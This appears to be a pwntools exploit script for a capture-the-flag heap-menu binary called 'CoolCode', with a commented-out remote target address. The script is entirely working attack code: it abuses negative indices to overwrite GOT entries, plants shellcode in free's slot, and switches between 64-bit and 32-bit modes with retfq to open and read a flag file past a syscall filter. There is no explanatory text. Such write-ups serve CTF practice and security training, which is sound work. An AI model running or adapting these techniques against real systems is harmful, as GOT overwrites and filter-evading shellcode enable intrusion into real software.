from pwn import *
context.log_level = 'debug'
p = process('./CoolCode')
#p = remote("39.107.119.192 ", 9999)  
def add(idx, content):
    p.sendlineafter("choice :", '1')
    p.sendlineafter("Index: ", str(idx))
    p.sendafter("messages: ", content)
def show(idx):
    p.sendlineafter("choice :", '2')
    p.sendlineafter("Index: ", str(idx))
def free(idx):
    p.sendlineafter("choice :", '3')
    p.sendlineafter("Index: ", str(idx))
def exp():
    read = '''
        xor eax, eax
        mov edi, eax
        push 0x60
        pop rdx
        mov esi, 0x1010101
        xor esi, 0x1612601
        syscall
        mov esp, esi
        retfq
    '''
    open_x86 = '''
        mov esp, 0x602770
        push 0x67616c66
        push esp
        pop ebx
        xor ecx,ecx
        mov eax,5
        int 0x80
    '''
    readflag = '''
        push 0x33
        push 0x60272e
        retfq
        mov rdi,0x3
        mov rsi,rsp
        mov rdx,0x60
        xor rax,rax
        syscall
        mov rdi,1
        mov rax,1
        syscall
    '''
    readflag = asm(readflag, arch = 'amd64')
    add(-22, '\xc3')#exit_got->ret
    add(-37, asm(read, arch = 'amd64'))#free_shellcode-.sc1
    #gdb.attach(p)
    free(0)

    payload = p64(0x602710)+p64(0x23)+asm(open_x86)+readflag
    p.sendline(payload)
    p.interactive()
if __name__ == '__main__':
    exp()
